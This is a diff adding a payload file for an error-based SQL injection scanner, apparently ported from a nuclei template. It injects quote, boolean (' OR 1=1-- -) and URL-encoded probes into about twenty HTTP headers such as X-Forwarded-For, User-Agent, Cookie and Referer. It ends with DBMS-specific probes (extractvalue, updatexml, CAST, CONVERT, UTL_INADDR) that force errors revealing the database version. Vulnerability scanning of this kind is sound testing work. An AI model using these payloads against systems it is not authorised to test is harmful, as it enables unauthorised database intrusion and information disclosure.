@@ -1,0 +1,325 @@
+# SQLi error-based via headers — header + payload collection
+# Payload probes ported from nuclei-templates dast/vulnerabilities/sqli/sqli-error-based.yaml
+# (injection payloads: '  "  ;  plus numeric/boolean/DBMS error-forcing variants)
+# Fingerprints: fingerprints/sqli.txt — 152 nuclei error-based SQLi patterns, all DBMS
+# Tip: error-based SQLi often shows up as HTTP 500 + a DB error string in the body.
+#      Use -all to see every response, and -v to surface per-request errors.
+
+# X-Forwarded-For
+X-Forwarded-For: '
+X-Forwarded-For: "
+X-Forwarded-For: ;
+X-Forwarded-For: \
+X-Forwarded-For: ')
+X-Forwarded-For: 1'
+X-Forwarded-For: 1"
+X-Forwarded-For: 1)
+X-Forwarded-For: 1' OR '1'='1
+X-Forwarded-For: ' OR 1=1-- -
+X-Forwarded-For: %27
+X-Forwarded-For: %22
+
+# X-Forwarded-Host
+X-Forwarded-Host: '
+X-Forwarded-Host: "
+X-Forwarded-Host: ;
+X-Forwarded-Host: \
+X-Forwarded-Host: ')
+X-Forwarded-Host: 1'
+X-Forwarded-Host: 1"
+X-Forwarded-Host: 1)
+X-Forwarded-Host: 1' OR '1'='1
+X-Forwarded-Host: ' OR 1=1-- -
+X-Forwarded-Host: %27
+X-Forwarded-Host: %22
+
+# X-Forwarded-Server
+X-Forwarded-Server: '
+X-Forwarded-Server: "
+X-Forwarded-Server: ;
+X-Forwarded-Server: \
+X-Forwarded-Server: ')
+X-Forwarded-Server: 1'
+X-Forwarded-Server: 1"
+X-Forwarded-Server: 1)
+X-Forwarded-Server: 1' OR '1'='1
+X-Forwarded-Server: ' OR 1=1-- -
+X-Forwarded-Server: %27
+X-Forwarded-Server: %22
+
+# X-Real-IP
+X-Real-IP: '
+X-Real-IP: "
+X-Real-IP: ;
+X-Real-IP: \
+X-Real-IP: ')
+X-Real-IP: 1'
+X-Real-IP: 1"
+X-Real-IP: 1)
+X-Real-IP: 1' OR '1'='1
+X-Real-IP: ' OR 1=1-- -
+X-Real-IP: %27
+X-Real-IP: %22
+
+# X-Client-IP
+X-Client-IP: '
+X-Client-IP: "
+X-Client-IP: ;
+X-Client-IP: \
+X-Client-IP: ')
+X-Client-IP: 1'
+X-Client-IP: 1"
+X-Client-IP: 1)
+X-Client-IP: 1' OR '1'='1
+X-Client-IP: ' OR 1=1-- -
+X-Client-IP: %27
+X-Client-IP: %22
+
+# X-Remote-IP
+X-Remote-IP: '
+X-Remote-IP: "
+X-Remote-IP: ;
+X-Remote-IP: \
+X-Remote-IP: ')
+X-Remote-IP: 1'
+X-Remote-IP: 1"
+X-Remote-IP: 1)
+X-Remote-IP: 1' OR '1'='1
+X-Remote-IP: ' OR 1=1-- -
+X-Remote-IP: %27
+X-Remote-IP: %22
+
+# X-Remote-Addr
+X-Remote-Addr: '
+X-Remote-Addr: "
+X-Remote-Addr: ;
+X-Remote-Addr: \
+X-Remote-Addr: ')
+X-Remote-Addr: 1'
+X-Remote-Addr: 1"
+X-Remote-Addr: 1)
+X-Remote-Addr: 1' OR '1'='1
+X-Remote-Addr: ' OR 1=1-- -
+X-Remote-Addr: %27
+X-Remote-Addr: %22
+
+# X-Originating-IP
+X-Originating-IP: '
+X-Originating-IP: "
+X-Originating-IP: ;
+X-Originating-IP: \
+X-Originating-IP: ')
+X-Originating-IP: 1'
+X-Originating-IP: 1"
+X-Originating-IP: 1)
+X-Originating-IP: 1' OR '1'='1
+X-Originating-IP: ' OR 1=1-- -
+X-Originating-IP: %27
+X-Originating-IP: %22
+
+# X-Host
+X-Host: '
+X-Host: "
+X-Host: ;
+X-Host: \
+X-Host: ')
+X-Host: 1'
+X-Host: 1"
+X-Host: 1)
+X-Host: 1' OR '1'='1
+X-Host: ' OR 1=1-- -
+X-Host: %27
+X-Host: %22
+
+# X-Original-URL
+X-Original-URL: '
+X-Original-URL: "
+X-Original-URL: ;
+X-Original-URL: \
+X-Original-URL: ')
+X-Original-URL: 1'
+X-Original-URL: 1"
+X-Original-URL: 1)
+X-Original-URL: 1' OR '1'='1
+X-Original-URL: ' OR 1=1-- -
+X-Original-URL: %27
+X-Original-URL: %22
+
+# X-Rewrite-URL
+X-Rewrite-URL: '
+X-Rewrite-URL: "
+X-Rewrite-URL: ;
+X-Rewrite-URL: \
+X-Rewrite-URL: ')
+X-Rewrite-URL: 1'
+X-Rewrite-URL: 1"
+X-Rewrite-URL: 1)
+X-Rewrite-URL: 1' OR '1'='1
+X-Rewrite-URL: ' OR 1=1-- -
+X-Rewrite-URL: %27
+X-Rewrite-URL: %22
+
+# True-Client-IP
+True-Client-IP: '
+True-Client-IP: "
+True-Client-IP: ;
+True-Client-IP: \
+True-Client-IP: ')
+True-Client-IP: 1'
+True-Client-IP: 1"
+True-Client-IP: 1)
+True-Client-IP: 1' OR '1'='1
+True-Client-IP: ' OR 1=1-- -
+True-Client-IP: %27
+True-Client-IP: %22
+
+# Client-IP
+Client-IP: '
+Client-IP: "
+Client-IP: ;
+Client-IP: \
+Client-IP: ')
+Client-IP: 1'
+Client-IP: 1"
+Client-IP: 1)
+Client-IP: 1' OR '1'='1
+Client-IP: ' OR 1=1-- -
+Client-IP: %27
+Client-IP: %22
+
+# Forwarded
+Forwarded: '
+Forwarded: "
+Forwarded: ;
+Forwarded: \
+Forwarded: ')
+Forwarded: 1'
+Forwarded: 1"
+Forwarded: 1)
+Forwarded: 1' OR '1'='1
+Forwarded: ' OR 1=1-- -
+Forwarded: %27
+Forwarded: %22
+
+# User-Agent
+User-Agent: '
+User-Agent: "
+User-Agent: ;
+User-Agent: \
+User-Agent: ')
+User-Agent: 1'
+User-Agent: 1"
+User-Agent: 1)
+User-Agent: 1' OR '1'='1
+User-Agent: ' OR 1=1-- -
+User-Agent: %27
+User-Agent: %22
+
+# Referer
+Referer: '
+Referer: "
+Referer: ;
+Referer: \
+Referer: ')
+Referer: 1'
+Referer: 1"
+Referer: 1)
+Referer: 1' OR '1'='1
+Referer: ' OR 1=1-- -
+Referer: %27
+Referer: %22
+
+# Origin
+Origin: '
+Origin: "
+Origin: ;
+Origin: \
+Origin: ')
+Origin: 1'
+Origin: 1"
+Origin: 1)
+Origin: 1' OR '1'='1
+Origin: ' OR 1=1-- -
+Origin: %27
+Origin: %22
+
+# Accept-Language
+Accept-Language: '
+Accept-Language: "
+Accept-Language: ;
+Accept-Language: \
+Accept-Language: ')
+Accept-Language: 1'
+Accept-Language: 1"
+Accept-Language: 1)
+Accept-Language: 1' OR '1'='1
+Accept-Language: ' OR 1=1-- -
+Accept-Language: %27
+Accept-Language: %22
+
+# Cookie
+Cookie: '
+Cookie: "
+Cookie: ;
+Cookie: \
+Cookie: ')
+Cookie: 1'
+Cookie: 1"
+Cookie: 1)
+Cookie: 1' OR '1'='1
+Cookie: ' OR 1=1-- -
+Cookie: %27
+Cookie: %22
+
+# X-Api-Version
+X-Api-Version: '
+X-Api-Version: "
+X-Api-Version: ;
+X-Api-Version: \
+X-Api-Version: ')
+X-Api-Version: 1'
+X-Api-Version: 1"
+X-Api-Version: 1)
+X-Api-Version: 1' OR '1'='1
+X-Api-Version: ' OR 1=1-- -
+X-Api-Version: %27
+X-Api-Version: %22
+
+# X-Requested-With
+X-Requested-With: '
+X-Requested-With: "
+X-Requested-With: ;
+X-Requested-With: \
+X-Requested-With: ')
+X-Requested-With: 1'
+X-Requested-With: 1"
+X-Requested-With: 1)
+X-Requested-With: 1' OR '1'='1
+X-Requested-With: ' OR 1=1-- -
+X-Requested-With: %27
+X-Requested-With: %22
+
+# DBMS-specific error-forcing probes
+# X-Forwarded-For
+X-Forwarded-For: 1' AND extractvalue(1,concat(0x7e,version()))-- -
+X-Forwarded-For: 1' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -
+X-Forwarded-For: ' AND 1=CAST((SELECT version()) AS int)-- -
+X-Forwarded-For: ' AND 1=CONVERT(int,@@version)-- -
+X-Forwarded-For: ' AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))-- -
+X-Forwarded-For: ' AND 1=1/*
+
+# User-Agent
+User-Agent: 1' AND extractvalue(1,concat(0x7e,version()))-- -
+User-Agent: 1' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -
+User-Agent: ' AND 1=CAST((SELECT version()) AS int)-- -
+User-Agent: ' AND 1=CONVERT(int,@@version)-- -
+User-Agent: ' AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))-- -
+User-Agent: ' AND 1=1/*
+
+# Referer
+Referer: 1' AND extractvalue(1,concat(0x7e,version()))-- -
+Referer: 1' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -
+Referer: ' AND 1=CAST((SELECT version()) AS int)-- -
+Referer: ' AND 1=CONVERT(int,@@version)-- -
+Referer: ' AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))-- -
+Referer: ' AND 1=1/*
